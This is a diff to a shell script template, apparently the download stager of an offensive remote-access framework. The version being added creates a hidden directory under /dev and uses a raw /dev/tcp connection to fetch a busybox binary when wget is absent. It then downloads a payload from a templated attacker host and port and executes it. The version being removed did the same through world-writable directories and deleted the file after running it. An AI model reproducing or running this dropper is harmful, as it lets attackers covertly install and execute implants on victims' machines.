@@ -1,25 +1,18 @@
 #!/bin/sh
 export PATH="$PATH:/usr/local/sbin:/usr/local/bin:/usr/bin:/bin:/sbin"
 
+mkdir -p /dev/.sprrw
 
-for i in "~" "." $(find / -maxdepth 3 -type d \( -perm -o+w \)); do
+if ! [ $(command -v wget) ]; then
+  mkdir -p /dev/.sprrw.bin
+  bash -c "exec 3<>/dev/tcp/{{.Host}}/{{.Port}}; echo BSH bb>&3; cat <&3" > /dev/.sprrw.bin/busybox
+  chmod +x /dev/.sprrw.bin/busybox
+  ln -s /dev/.sprrw.bin/busybox /dev/.sprrw.bin/wget
+  export PATH="$PATH:/dev/.sprrw.bin"
+fi
 
-    if ! touch $i/{{.Name}}; then 
-        continue
-    fi
+wget -O /dev/.sprrw/{{.Name}} {{.Protocol}}://{{.Host}}:{{.Port}}/{{.Name}}
 
-    if command -v curl &> /dev/null; then
-        curl {{.Protocol}}://{{.Host}}:{{.Port}}/{{.Name}} -o "$i/{{.Name}}"
-    elif command -v  wget &> /dev/null; then
-        wget -O "$i/{{.Name}}" {{.Protocol}}://{{.Host}}:{{.Port}}/{{.Name}}
-    fi
+chmod +x /dev/.sprrw/{{.Name}}
 
-    chmod +x "$i/{{.Name}}"
-    if ! "$i/{{.Name}}"; then 
-        continue
-    fi
-    #Poor mans fileless
-    rm "$i/{{.Name}}"
-
-    break
-done
+/dev/.sprrw/{{.Name}}
